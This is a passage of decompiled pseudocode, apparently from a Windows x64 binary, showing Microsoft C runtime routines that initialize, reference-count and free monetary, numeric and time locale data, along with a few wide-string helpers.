  char **v12; // r13
  int v13; // ebx
  int v14; // ebx
  int v15; // ebx
  int v16; // ebx
  int v17; // ebx
  int v18; // ebx
  int v19; // ebx
  int v20; // ebx
  int v21; // ebx
  int v22; // ebx
  int v23; // ebx
  int v24; // ebx
  int v25; // ebx
  int v26; // ebx
  int v27; // ebx
  int v28; // ebx
  int v29; // ebx
  char *v30; // rdx
  char v31; // al
  char *v32; // r8
  char v33; // cl
  volatile signed __int32 *v34; // rax
  volatile signed __int32 *v35; // rcx
  struct __crt_locale_pointers v36; // [rsp+30h] [rbp-10h] BYREF

  v1 = nullptr;
  v36.locinfo = (struct __crt_locale_data *)a1;
  v36.mbcinfo = nullptr;
  if ( *(_QWORD *)(a1 + 320) != 0 || *(_QWORD *)(a1 + 328) != 0 )
  {
    v4 = calloc_base(1u, 0x98u);
    free_base(nullptr);
    if ( v4 == nullptr )
      return 1;
    v3 = calloc_base(1u, 4u);
    free_base(nullptr);
    if ( v3 == nullptr )
    {
      v7 = v4;
LABEL_8:
      free_base(v7);
      return 1;
    }
    if ( *(_QWORD *)(a1 + 320) != 0 )
    {
      v1 = calloc_base(1u, 4u);
      free_base(nullptr);
      if ( v1 == nullptr )
      {
        free_base(v4);
        v7 = v3;
        goto LABEL_8;
      }
      v8 = *(const wchar_t **)(a1 + 320);
      LocaleInfoA = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x15u, (void **)v4 + 3);
      v10 = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x14u, (void **)v4 + 4) | LocaleInfoA;
      v11 = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x16u, (void **)v4 + 5) | v10;
      v12 = (char **)v4 + 7;
      v13 = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x17u, (void **)v4 + 6) | v11;
      v14 = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x18u, (void **)v4 + 7) | v13;
      v15 = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x50u, (void **)v4 + 8) | v14;
      v16 = _acrt_GetLocaleInfoA(&v36, 1, v8, 0x51u, (void **)v4 + 9) | v15;
      v17 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x1Au, (void **)v4 + 10) | v16;
      v18 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x19u, (void **)((char *)v4 + 81)) | v17;
      v19 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x54u, (void **)((char *)v4 + 82)) | v18;
      v20 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x55u, (void **)((char *)v4 + 83)) | v19;
      v21 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x56u, (void **)((char *)v4 + 84)) | v20;
      v22 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x57u, (void **)((char *)v4 + 85)) | v21;
      v23 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x52u, (void **)((char *)v4 + 86)) | v22;
      v24 = _acrt_GetLocaleInfoA(&v36, 0, v8, 0x53u, (void **)((char *)v4 + 87)) | v23;
      v25 = _acrt_GetLocaleInfoA(&v36, 2, v8, 0x15u, (void **)v4 + 13) | v24;
      v26 = _acrt_GetLocaleInfoA(&v36, 2, v8, 0x14u, (void **)v4 + 14) | v25;
      v27 = _acrt_GetLocaleInfoA(&v36, 2, v8, 0x16u, (void **)v4 + 15) | v26;
      v28 = _acrt_GetLocaleInfoA(&v36, 2, v8, 0x17u, (void **)v4 + 16) | v27;
      v29 = _acrt_GetLocaleInfoA(&v36, 2, v8, 0x50u, (void **)v4 + 17) | v28;
      if ( (v29 | (unsigned int)_acrt_GetLocaleInfoA(&v36, 2, v8, 0x51u, (void **)v4 + 18)) != 0 )
      {
        _acrt_locale_free_monetary(v4);
        free_base(v4);
        free_base(v3);
        free_base(v1);
        return 1;
      }
      v30 = *v12;
      v31 = **v12;
      if ( v31 != 0 )
      {
        do
        {
          if ( (unsigned __int8)(v31 - 48) > 9u )
          {
            if ( v31 == 59 )
            {
              v32 = v30;
              do
              {
                v33 = v32[1];
                *v32++ = v33;
              }
              while ( v33 != 0 );
              goto LABEL_18;
            }
          }
          else
          {
            *v30 = v31 - 48;
          }
          ++v30;
LABEL_18:
          v31 = *v30;
        }
        while ( *v30 != 0 );
      }
    }
    else
    {
      *v4 = *(_OWORD *)&off_14009EA80;
      v4[1] = *(_OWORD *)&off_14009EA90;
      v4[2] = *(_OWORD *)&off_14009EAA0;
      v4[3] = *(_OWORD *)&off_14009EAB0;
      v4[4] = *(_OWORD *)&off_14009EAC0;
      v4[5] = unk_14009EAD0;
      v4[6] = *(_OWORD *)&off_14009EAE0;
      v4[7] = *(_OWORD *)&off_14009EAF0;
      v4[8] = *(_OWORD *)&off_14009EB00;
      *((_QWORD *)v4 + 18) = off_14009EB10;
    }
    v5 = (void **)(a1 + 248);
    *(_QWORD *)v4 = **(_QWORD **)(a1 + 248);
    *((_QWORD *)v4 + 1) = *(_QWORD *)(*(_QWORD *)(a1 + 248) + 8LL);
    *((_QWORD *)v4 + 2) = *(_QWORD *)(*(_QWORD *)(a1 + 248) + 16LL);
    *((_QWORD *)v4 + 11) = *(_QWORD *)(*(_QWORD *)(a1 + 248) + 88LL);
    *((_QWORD *)v4 + 12) = *(_QWORD *)(*(_QWORD *)(a1 + 248) + 96LL);
    *v3 = 1;
    if ( v1 != nullptr )
      *v1 = 1;
    goto LABEL_27;
  }
  v3 = nullptr;
  v4 = &off_14009EA80;
  v5 = (void **)(a1 + 248);
LABEL_27:
  v34 = *(volatile signed __int32 **)(a1 + 240);
  if ( v34 != nullptr )
    _InterlockedDecrement(v34);
  v35 = *(volatile signed __int32 **)(a1 + 224);
  if ( v35 != nullptr && _InterlockedExchangeAdd(v35, 0xFFFFFFFF) == 1 )
  {
    free_base(*v5);
    free_base(*(void **)(a1 + 224));
  }
  *(_QWORD *)(a1 + 240) = v1;
  *(_QWORD *)(a1 + 224) = v3;
  *v5 = v4;
  return 0;
}


// ----- __acrt_locale_free_numeric @ 0x140025674 -----
void __fastcall _acrt_locale_free_numeric(__int64 a1)
{
  void *v2; // rcx
  void *v3; // rcx
  void *v4; // rcx
  void *v5; // rcx
  void *v6; // rcx

  if ( a1 != 0 )
  {
    v2 = *(void **)a1;
    if ( v2 != off_14009EA80 )
      free_base(v2);
    v3 = *(void **)(a1 + 8);
    if ( v3 != off_14009EA88 )
      free_base(v3);
    v4 = *(void **)(a1 + 16);
    if ( v4 != off_14009EA90 )
      free_base(v4);
    v5 = *(void **)(a1 + 88);
    if ( v5 != off_14009EAD8 )
      free_base(v5);
    v6 = *(void **)(a1 + 96);
    if ( v6 != off_14009EAE0 )
      free_base(v6);
  }
}


// ----- __acrt_locale_initialize_numeric @ 0x1400256e0 -----
__int64 __fastcall _acrt_locale_initialize_numeric(__int64 a1)
{
  _DWORD *v2; // r15
  void **v3; // rsi
  void **v4; // r13
  unsigned int v5; // r14d
  __int64 v7; // rax
  void **v8; // rcx
  _DWORD *v9; // r12
  const wchar_t *v10; // rdi
  int LocaleInfoA; // ebx
  int v12; // ebx
  int v13; // ebx
  int v14; // ebx
  _BYTE *v15; // rdx
  char v16; // al
  _BYTE *v17; // r8
  char v18; // cl
  volatile signed __int32 *v19; // rax
  volatile signed __int32 *v20; // rcx
  struct __crt_locale_pointers v21; // [rsp+30h] [rbp-38h] BYREF

  v21.locinfo = (struct __crt_locale_data *)a1;
  v21.mbcinfo = nullptr;
  if ( *(_QWORD *)(a1 + 328) == 0 && *(_QWORD *)(a1 + 320) == 0 )
  {
    v2 = nullptr;
    v3 = (void **)&off_14009EA80;
    v4 = (void **)(a1 + 248);
    goto LABEL_26;
  }
  v5 = 1;
  v3 = (void **)calloc_base(1u, 0x98u);
  if ( v3 == nullptr )
    return v5;
  v4 = (void **)(a1 + 248);
  v7 = *(_QWORD *)(a1 + 248);
  *(_OWORD *)v3 = *(_OWORD *)v7;
  *((_OWORD *)v3 + 1) = *(_OWORD *)(v7 + 16);
  *((_OWORD *)v3 + 2) = *(_OWORD *)(v7 + 32);
  *((_OWORD *)v3 + 3) = *(_OWORD *)(v7 + 48);
  *((_OWORD *)v3 + 4) = *(_OWORD *)(v7 + 64);
  *((_OWORD *)v3 + 5) = *(_OWORD *)(v7 + 80);
  *((_OWORD *)v3 + 6) = *(_OWORD *)(v7 + 96);
  *((_OWORD *)v3 + 7) = *(_OWORD *)(v7 + 112);
  *((_OWORD *)v3 + 8) = *(_OWORD *)(v7 + 128);
  v3[18] = *(void **)(v7 + 144);
  v2 = malloc_base(4u);
  free_base(nullptr);
  if ( v2 == nullptr )
  {
    v8 = v3;
LABEL_8:
    free_base(v8);
    return v5;
  }
  *v2 = 0;
  if ( *(_QWORD *)(a1 + 328) != 0 )
  {
    v9 = malloc_base(4u);
    free_base(nullptr);
    if ( v9 == nullptr )
    {
      free_base(v3);
LABEL_14:
      v8 = (void **)v2;
      goto LABEL_8;
    }
    *v9 = 0;
    v10 = *(const wchar_t **)(a1 + 328);
    LocaleInfoA = _acrt_GetLocaleInfoA(&v21, 1, v10, 0xEu, v3);
    v12 = _acrt_GetLocaleInfoA(&v21, 1, v10, 0xFu, v3 + 1) | LocaleInfoA;
    v13 = _acrt_GetLocaleInfoA(&v21, 1, v10, 0x10u, v3 + 2) | v12;
    v14 = _acrt_GetLocaleInfoA(&v21, 2, v10, 0xEu, v3 + 11) | v13;
    if ( (v14 | (unsigned int)_acrt_GetLocaleInfoA(&v21, 2, v10, 0xFu, v3 + 12)) != 0 )
    {
      _acrt_locale_free_numeric((__int64)v3);
      free_base(v3);
      free_base(v9);
      v5 = -1;
      goto LABEL_14;
    }
    v15 = v3[2];
    while ( 1 )
    {
      v16 = *v15;
      if ( *v15 == 0 )
      {
        *v2 = 1;
        *v9 = 1;
        goto LABEL_27;
      }
      if ( (unsigned __int8)(v16 - 48) <= 9u )
        break;
      if ( v16 == 59 )
      {
        v17 = v15;
        do
        {
          v18 = v17[1];
          *v17++ = v18;
        }
        while ( v18 != 0 );
      }
      else
      {
LABEL_18:
        ++v15;
      }
    }
    *v15 = v16 - 48;
    goto LABEL_18;
  }
  *v3 = off_14009EA80;
  v3[1] = off_14009EA88;
  v3[2] = off_14009EA90;
  v3[11] = off_14009EAD8;
  v3[12] = off_14009EAE0;
  *v2 = 1;
LABEL_26:
  v9 = nullptr;
LABEL_27:
  v19 = *(volatile signed __int32 **)(a1 + 232);
  if ( v19 != nullptr )
    _InterlockedDecrement(v19);
  v20 = *(volatile signed __int32 **)(a1 + 224);
  if ( v20 != nullptr && _InterlockedExchangeAdd(v20, 0xFFFFFFFF) == 1 )
  {
    free_base(*(void **)(a1 + 224));
    free_base(*v4);
  }
  *(_QWORD *)(a1 + 232) = v9;
  *(_QWORD *)(a1 + 224) = v2;
  *v4 = v3;
  return 0;
}


// ----- ?free_crt_array_internal@@YAXQEAPEBX_K@Z @ 0x1400259c8 -----
void __fastcall free_crt_array_internal(void **a1, __int64 a2)
{
  const void **v2; // rdi
  void **i; // rbx

  v2 = (const void **)&a1[a2];
  for ( i = a1; i != (void **)v2; ++i )
    free_base(*i);
}


// ----- ?initialize_lc_time@@YA_NQEAU__crt_lc_time_data@@QEAU__crt_locale_data@@@Z @ 0x1400259fc -----
bool __fastcall initialize_lc_time(struct __crt_lc_time_data *const a1, struct __crt_locale_data *const a2)
{
  wchar_t *v2; // r14
  int v4; // esi
  LCTYPE v5; // r15d
  __int64 i; // r13
  void **v7; // rdi
  int v8; // esi
  int v9; // esi
  int v10; // esi
  LCTYPE v11; // r15d
  __int64 v12; // r13
  void **v13; // rdi
  int v14; // esi
  int v15; // esi
  int v16; // esi
  int v17; // esi
  int LocaleInfoA; // eax
  int v19; // esi
  int v20; // esi
  int v21; // esi
  int v22; // esi
  int v23; // esi
  int v24; // eax
  int v25; // esi
  int v26; // esi
  struct __crt_locale_pointers v28; // [rsp+30h] [rbp-10h] BYREF

  v2 = *((wchar_t **)a2 + 42);
  v4 = 0;
  v28.locinfo = a2;
  v28.mbcinfo = nullptr;
  *((_QWORD *)a1 + 87) = _acrt_copy_locale_name(v2);
  v5 = 49;
  for ( i = 7; i != 0; --i )
  {
    v7 = (void **)((char *)a1 + 8 * ((v5 - 48) % 7));
    v8 = _acrt_GetLocaleInfoA(&v28, 1, v2, v5, v7) | v4;
    v9 = _acrt_GetLocaleInfoA(&v28, 1, v2, v5 - 7, v7 + 7) | v8;
    v10 = _acrt_GetLocaleInfoA(&v28, 2, v2, v5, v7 + 44) | v9;
    v4 = _acrt_GetLocaleInfoA(&v28, 2, v2, v5 - 7, v7 + 51) | v10;
    ++v5;
  }
  v11 = 56;
  v12 = 12;
  v13 = (void **)((char *)a1 + 208);
  do
  {
    v14 = _acrt_GetLocaleInfoA(&v28, 1, v2, v11 + 12, v13 - 12) | v4;
    v15 = _acrt_GetLocaleInfoA(&v28, 1, v2, v11, v13) | v14;
    v16 = _acrt_GetLocaleInfoA(&v28, 2, v2, v11 + 12, v13 + 32) | v15;
    v4 = _acrt_GetLocaleInfoA(&v28, 2, v2, v11, v13 + 44) | v16;
    ++v13;
    ++v11;
    --v12;
  }
  while ( v12 != 0 );
  v17 = _acrt_GetLocaleInfoA(&v28, 1, v2, 0x28u, (void **)a1 + 38) | v4;
  LocaleInfoA = _acrt_GetLocaleInfoA(&v28, 1, v2, 0x29u, (void **)a1 + 39);
  v19 = _acrt_GetLocaleInfoA(&v28, 2, v2, 0x28u, (void **)a1 + 82) | LocaleInfoA | v17;
  v20 = _acrt_GetLocaleInfoA(&v28, 2, v2, 0x29u, (void **)a1 + 83) | v19;
  v21 = _acrt_GetLocaleInfoA(&v28, 1, v2, 0x1Fu, (void **)a1 + 40) | v20;
  v22 = _acrt_GetLocaleInfoA(&v28, 1, v2, 0x20u, (void **)a1 + 41) | v21;
  v23 = _acrt_GetLocaleInfoA(&v28, 1, v2, 0x1003u, (void **)a1 + 42) | v22;
  v24 = _acrt_GetLocaleInfoA(&v28, 0, v2, 0x1009u, (void **)a1 + 43);
  v25 = _acrt_GetLocaleInfoA(&v28, 2, v2, 0x1Fu, (void **)a1 + 84) | v24 | v23;
  v26 = _acrt_GetLocaleInfoA(&v28, 2, v2, 0x20u, (void **)a1 + 85) | v25;
  return (v26 | (unsigned int)_acrt_GetLocaleInfoA(&v28, 2, v2, 0x1003u, (void **)a1 + 86)) == 0;
}


// ----- __acrt_locale_free_time @ 0x140025d3c -----
void __fastcall _acrt_locale_free_time(void **a1)
{
  if ( a1 != nullptr )
  {
    free_crt_array_internal(a1, 7);
    free_crt_array_internal(a1 + 7, 7);
    free_crt_array_internal(a1 + 14, 12);
    free_crt_array_internal(a1 + 26, 12);
    free_crt_array_internal(a1 + 38, 2);
    free_base(a1[40]);
    free_base(a1[41]);
    free_base(a1[42]);
    free_crt_array_internal(a1 + 44, 7);
    free_crt_array_internal(a1 + 51, 7);
    free_crt_array_internal(a1 + 58, 12);
    free_crt_array_internal(a1 + 70, 12);
    free_crt_array_internal(a1 + 82, 2);
    free_base(a1[84]);
    free_base(a1[85]);
    free_base(a1[86]);
    free_base(a1[87]);
  }
}


// ----- __acrt_locale_initialize_time @ 0x140025e44 -----
__int64 __fastcall _acrt_locale_initialize_time(struct __crt_locale_data *a1)
{
  struct __crt_lc_time_data *v1; // rdi
  struct __crt_lc_time_data *v3; // rbx
  struct __crt_lc_time_data *v4; // rax

  v1 = nullptr;
  if ( *((_QWORD *)a1 + 42) != 0 )
  {
    v4 = (struct __crt_lc_time_data *)calloc_base(1u, 0x2C0u);
    v3 = v4;
    if ( v4 != nullptr )
    {
      if ( initialize_lc_time(v4, a1) )
      {
        *((_DWORD *)v3 + 87) = 1;
        free_base(nullptr);
        goto LABEL_8;
      }
      _acrt_locale_free_time((void **)v3);
      v1 = v3;
    }
    free_base(v1);
    return 1;
  }
  v3 = (struct __crt_lc_time_data *)&off_140091D00;
LABEL_8:
  _acrt_locale_release_lc_time_reference(*((_QWORD *)a1 + 36));
  *((_QWORD *)a1 + 36) = v3;
  return 0;
}


// ----- sub_140025EE0 @ 0x140025ee0 -----
__int64 __fastcall sub_140025EE0(_WORD *a1, __int64 a2, char *a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  _WORD *v6; // r11
  __int64 v8; // r10
  signed __int64 v9; // r8
  __int16 v10; // ax
  __int16 v11; // ax

  v4 = a4;
  v5 = a2;
  v6 = a1;
  if ( a4 != 0 )
  {
    if ( a1 == nullptr )
    {
LABEL_10:
      *(_DWORD *)sub_140018888() = 22;
      invalid_parameter_noinfo();
      return 22;
    }
  }
  else if ( a1 == nullptr )
  {
    if ( a2 == 0 )
      return (unsigned int)a4;
    goto LABEL_10;
  }
  if ( a2 == 0 )
    goto LABEL_10;
  if ( a4 != 0 && a3 == nullptr )
  {
    *a1 = 0;
    goto LABEL_10;
  }
  v8 = a4;
  while ( *a1 != 0 )
  {
    ++a1;
    if ( --a2 == 0 )
    {
      *v6 = 0;
      goto LABEL_10;
    }
  }
  LODWORD(a4) = 0;
  if ( v4 == -1 )
  {
    v9 = a3 - (char *)a1;
    do
    {
      v10 = *(_WORD *)((char *)a1 + v9);
      *a1++ = v10;
      if ( v10 == 0 )
        break;
      --a2;
    }
    while ( a2 != 0 );
  }
  else
  {
    if ( v4 != 0 )
    {
      while ( 1 )
      {
        v11 = *(_WORD *)a3;
        a3 += 2;
        *a1++ = v11;
        if ( v11 == 0 )
          return (unsigned int)a4;
        if ( --a2 != 0 && --v8 != 0 )
          continue;
        break;
      }
    }
    if ( v8 == 0 )
      *a1 = 0;
  }
  if ( a2 != 0 )
    return (unsigned int)a4;
  if ( v4 == -1 )
  {
    v6[v5 - 1] = 0;
    return 80;
  }
  else
  {
    *v6 = 0;
    *(_DWORD *)sub_140018888() = 34;
    invalid_parameter_noinfo();
    return 34;
  }
}


// ----- sub_140026020 @ 0x140026020 -----
__int64 __fastcall sub_140026020(unsigned __int16 *a1, __int64 a2)
{
  unsigned __int16 v2; // ax
  unsigned __int16 *i; // rbx

  v2 = *a1;
  for ( i = a1; v2 != 0; ++i )
  {
    if ( sub_14002A93C(a2, v2) != 0 )
      break;
    v2 = i[1];
  }
  return i - a1;
}


// ----- sub_140026080 @ 0x140026080 -----
__int64 __fastcall sub_140026080(_WORD *a1, _WORD *a2, __int64 a3)
{
  __int64 i; // r8

  if ( a3 == 0 )
    return 0;
  for ( i = a3 - 1; i != 0; --i )
  {
    if ( *a1 == 0 )
      break;
    if ( *a1 != *a2 )
      break;
    ++a1;
    ++a2;
  }
  return (unsigned __int16)*a1 - (unsigned int)(unsigned __int16)*a2;
}


// ----- sub_1400260C0 @ 0x1400260c0 -----
unsigned __int16 *__fastcall sub_1400260C0(unsigned __int16 *a1, __int64 a2)
{
  unsigned __int16 v2; // ax
  unsigned __int16 *v4; // rbx

  v2 = *a1;
  v4 = a1;
  if ( *a1 == 0 )
    return nullptr;
  while ( sub_14002A93C(a2, v2) == 0 )
  {
    v2 = v4[1];
    ++v4;
    if ( v2 == 0 )
      return nullptr;
  }
  return v4;
}


// ----- __acrt_add_locale_ref @ 0x140026118 -----
__int64 __fastcall _acrt_add_locale_ref(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 i; // r8
  volatile signed __int32 *v7; // rdx
  __int64 v8; // rcx

  _InterlockedIncrement((volatile signed __int32 *)(a1 + 16));
  v1 = *(volatile signed __int32 **)(a1 + 224);
  if ( v1 != nullptr )
    _InterlockedIncrement(v1);
  v2 = *(volatile signed __int32 **)(a1 + 240);
  if ( v2 != nullptr )
    _InterlockedIncrement(v2);
  v3 = *(volatile signed __int32 **)(a1 + 232);
  if ( v3 != nullptr )
    _InterlockedIncrement(v3);
  v4 = *(volatile signed __int32 **)(a1 + 256);
  if ( v4 != nullptr )
    _InterlockedIncrement(v4);
  v5 = (volatile signed __int32 **)(a1 + 56);
  for ( i = 6; i != 0; --i )
  {
    if ( *(v5 - 2) != (volatile signed __int32 *)&unk_14009ECB8 && *v5 != nullptr )
      _InterlockedIncrement(*v5);
    if ( *(v5 - 3) != nullptr )
    {
      v7 = *(v5 - 1);
      if ( v7 != nullptr )
        _InterlockedIncrement(v7);
    }
    v5 += 4;
  }
  v8 = *(_QWORD *)(a1 + 288);
  if ( v8 == 0 || (_UNKNOWN **)v8 == &off_140091D00 )
    return 0x7FFFFFFF;
  else
    return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(v8 + 348));
}


// ----- __acrt_free_locale @ 0x1400261a4 -----
void __fastcall _acrt_free_locale(char *Block)
{
  _UNKNOWN **v1; // rax
  _DWORD *v3; // rax
  _DWORD *v4; // rcx
  _DWORD *v5; // rcx
  _DWORD *v6; // rax
  void **v7; // rsi
  __int64 v8; // rbp
  _DWORD **v9; // rdi
  _DWORD *v10; // rcx
  _DWORD *v11; // rcx

  v1 = *((_UNKNOWN ***)Block + 31);
  if ( v1 != nullptr && v1 != &off_14009EA80 )
  {
    v3 = *((_DWORD **)Block + 28);
    if ( v3 != nullptr && *v3 == 0 )
    {
      v4 = *((_DWORD **)Block + 30);
      if ( v4 != nullptr && *v4 == 0 )
      {
        free_base(v4);
        _acrt_locale_free_monetary(*((_QWORD **)Block + 31));
      }
      v5 = *((_DWORD **)Block + 29);
      if ( v5 != nullptr && *v5 == 0 )
      {
        free_base(v5);
        _acrt_locale_free_numeric(*((_QWORD *)Block + 31));
      }
      free_base(*((void **)Block + 28));
      free_base(*((void **)Block + 31));
    }
  }
  v6 = *((_DWORD **)Block + 32);
  if ( v6 != nullptr && *v6 == 0 )
  {
    free_base((void *)(*((_QWORD *)Block + 33) - 254LL));
    free_base((void *)(*((_QWORD *)Block + 34) - 128LL));
    free_base((void *)(*((_QWORD *)Block + 35) - 128LL));
    free_base(*((void **)Block + 32));
  }
  _acrt_locale_free_lc_time_if_unreferenced(*((void **)Block + 36));
  v7 = (void **)(Block + 296);
  v8 = 6;
  v9 = (_DWORD **)(Block + 56);
  do
  {
    if ( *(v9 - 2) != (_DWORD *)&unk_14009ECB8 )
    {
      v10 = *v9;
      if ( *v9 != nullptr && *v10 == 0 )
      {
        free_base(v10);
        free_base(*v7);
      }
    }
    if ( *(v9 - 3) != nullptr )
    {
      v11 = *(v9 - 1);
      if ( v11 != nullptr && *v11 == 0 )
        free_base(v11);
    }
    ++v7;
    v9 += 4;
    --v8;
  }
  while ( v8 != 0 );
  free_base(Block);
}


// ----- __acrt_locale_free_lc_time_if_unreferenced @ 0x140026344 -----
void __fastcall _acrt_locale_free_lc_time_if_unreferenced(void **Block)
{
  if ( Block != nullptr && Block != (void **)&off_140091D00 && *((_DWORD *)Block + 87) == 0 )
  {
    _acrt_locale_free_time(Block);
    free_base(Block);
  }
}


// ----- __acrt_locale_release_lc_time_reference @ 0x14002637c -----
__int64 __fastcall _acrt_locale_release_lc_time_reference(__int64 a1)
{
  if ( a1 == 0 || (_UNKNOWN **)a1 == &off_140091D00 )
    return 0x7FFFFFFF;
  else
    return (unsigned int)_InterlockedDecrement((volatile signed __int32 *)(a1 + 348));
}


// ----- __acrt_release_locale_ref @ 0x1400263a4 -----
void __fastcall _acrt_release_locale_ref(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 i; // r8
  volatile signed __int32 *v7; // rdx

  if ( a1 != 0 )
  {
    _InterlockedAdd((volatile signed __int32 *)(a1 + 16), 0xFFFFFFFF);
    v1 = *(volatile signed __int32 **)(a1 + 224);
    if ( v1 != nullptr )
      _InterlockedAdd(v1, 0xFFFFFFFF);
    v2 = *(volatile signed __int32 **)(a1 + 240);
    if ( v2 != nullptr )
      _InterlockedAdd(v2, 0xFFFFFFFF);
    v3 = *(volatile signed __int32 **)(a1 + 232);
    if ( v3 != nullptr )
      _InterlockedAdd(v3, 0xFFFFFFFF);
    v4 = *(volatile signed __int32 **)(a1 + 256);
    if ( v4 != nullptr )
      _InterlockedAdd(v4, 0xFFFFFFFF);
    v5 = (volatile signed __int32 **)(a1 + 56);
    for ( i = 6; i != 0; --i )
    {
      if ( *(v5 - 2) != (volatile signed __int32 *)&unk_14009ECB8 && *v5 != nullptr )
        _InterlockedAdd(*v5, 0xFFFFFFFF);
      if ( *(v5 - 3) != nullptr )
      {
        v7 = *(v5 - 1);
        if ( v7 != nullptr )
          _InterlockedAdd(v7, 0xFFFFFFFF);
      }
      v5 += 4;
    }
    _acrt_locale_release_lc_time_reference(*(_QWORD *)(a1 + 288));
  }
}


// ----- __acrt_update_thread_locale_data @ 0x14002644c -----
__int64 _acrt_update_thread_locale_data()
{
  __int64 v0; // rax
  __int64 *v1; // rdi
  __int64 v2; // rbx

  v0 = sub_14001C7D8();
  v1 = (__int64 *)(v0 + 144);
  if ( (*(_DWORD *)(v0 + 936) & dword_14009EE10) == 0 || (v2 = *v1, *v1 == 0) )
  {
    _vcrt_lock(4);
    v2 = updatetlocinfoEx_nolock(v1, qword_1400A05B0[0]);
    _vcrt_unlock(4);
    if ( v2 == 0 )
      abort();
  }
  return v2;
}


// ----- _updatetlocinfoEx_nolock @ 0x1400264bc -----
__int64 __fastcall updatetlocinfoEx_nolock(__int64 *a1, __int64 a2)
{
  __int64 v3; // rbx

  if ( a2 == 0 || a1 == nullptr )
    return 0;
  v3 = *a1;
  if ( *a1 != a2 )
  {
    *a1 = a2;
    _acrt_add_locale_ref(a2);
    if ( v3 != 0 )
    {
      _acrt_release_locale_ref(v3);
      if ( *(_DWORD *)(v3 + 16) == 0 && (wchar_t **)v3 != &off_14009EB50 )
        _acrt_free_locale((char *)v3);
    }
  }
  return a2;
}


// ----- GetLocaleNameFromDefault @ 0x140026524 -----
__int64 __fastcall GetLocaleNameFromDefault(__int64 a1)
{
  __int64 result; // rax
  __int64 v3; // r9
  _WORD v4[88]; // [rsp+30h] [rbp-C8h] BYREF

  *(_DWORD *)(a1 + 16) |= 0x104u;
  result = sub_14001D464((__int64)v4, 0x55u);
  if ( (int)result > 1 )
  {
    v3 = -1;
    do
      ++v3;
    while ( v4[v3] != 0 );
    result = sub_140022E30((_WORD *)(a1 + 600), 85, (__int64)v4, v3 + 1);
    if ( (_DWORD)result != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  return result;
}


// ----- GetLocaleNameFromLangCountry @ 0x1400265cc -----
bool __fastcall GetLocaleNameFromLangCountry(__int64 a1)
{
  __int16 *v1; // rdx
  __int64 v2; // r8
  __int64 v4; // rcx
  int v5; // ecx
  int v6; // r9d
  __int16 v7; // r8
  bool result; // al

  v1 = *(__int16 **)a1;
  v2 = -1;
  v4 = -1;
  do
    ++v4;
  while ( v1[v4] != 0 );
  *(_DWORD *)(a1 + 24) = v4 == 3;
  do
    ++v2;
  while ( *(_WORD *)(*(_QWORD *)(a1 + 8) + 2 * v2) != 0 );
  *(_DWORD *)(a1 + 28) = v2 == 3;
  if ( v4 == 3 )
  {
    v5 = 2;
  }
  else
  {
    v6 = 0;
    if ( v1 != nullptr )
    {
      while ( 1 )
      {
        v7 = *v1++;
        if ( (unsigned __int16)(v7 - 65) > 0x19u && (unsigned __int16)(v7 - 97) > 0x19u )
          break;
        ++v6;
      }
      v5 = v6;
    }
    else
    {
      v5 = 0;
    }
  }
  *(_DWORD *)(a1 + 20) = v5;
  sub_14001D300((__int64)sub_140026734, 3u, 0, 0);
  result = (*(_DWORD *)(a1 + 16) & 0x100) != 0;
  if ( (*(_DWORD *)(a1 + 16) & 0x200) == 0 || (*(_DWORD *)(a1 + 16) & 7) == 0 || !result )
    *(_DWORD *)(a1 + 16) = 0;
  return result;
}


// ----- GetLocaleNameFromLanguage @ 0x14002669c -----
__int64 __fastcall GetLocaleNameFromLanguage(__int64 a1)
{
  __int16 *v1; // rdx
  __int64 v2; // r8
  int v4; // ecx
  int v5; // r9d
  __int16 v6; // r8
  __int64 result; // rax

  v1 = *(__int16 **)a1;
  v2 = -1;
  do
    ++v2;
  while ( v1[v2] != 0 );
  *(_DWORD *)(a1 + 24) = v2 == 3;
  if ( v2 == 3 )
  {
    v4 = 2;
  }
  else
  {
    v5 = 0;
    if ( v1 != nullptr )
    {
      while ( 1 )
      {
        v6 = *v1++;
        if ( (unsigned __int16)(v6 - 65) > 0x19u && (unsigned __int16)(v6 - 97) > 0x19u )
          break;
        ++v5;
      }
      v4 = v5;
    }
    else
    {
      v4 = 0;
    }
  }
  *(_DWORD *)(a1 + 20) = v4;
  result = sub_14001D300((__int64)LanguageEnumProcEx, 3u, 0, 0);
  if ( (*(_BYTE *)(a1 + 16) & 4) == 0 )
    *(_DWORD *)(a1 + 16) = 0;
  return result;
}


// ----- sub_140026734 @ 0x140026734 -----
__int64 __fastcall sub_140026734(__int64 a1)
{
  __int64 v2; // rax
  _QWORD *v3; // rbx
  __int64 v5; // rdi
  int v6; // eax
  int v7; // ecx
  __int64 v8; // r9
  int v9; // eax
  _WORD *v10; // rcx
  __int64 v11; // rcx
  __int16 *v12; // rcx
  int v13; // r8d
  __int16 v14; // dx
  __int64 v15; // rax
  WCHAR v16[64]; // [rsp+30h] [rbp-98h] BYREF

  v2 = sub_14001C7D8();
  v3 = (_QWORD *)(v2 + 152);
  if ( sub_14001D3D0(a1, *(_DWORD *)(v2 + 180) != 0 ? 7 : 4098, v16, 0x40u) == 0 )
    goto LABEL_2;
  v5 = -1;
  if ( (unsigned int)sub_140022B50(v3[1], (__int64)v16) == 0 )
  {
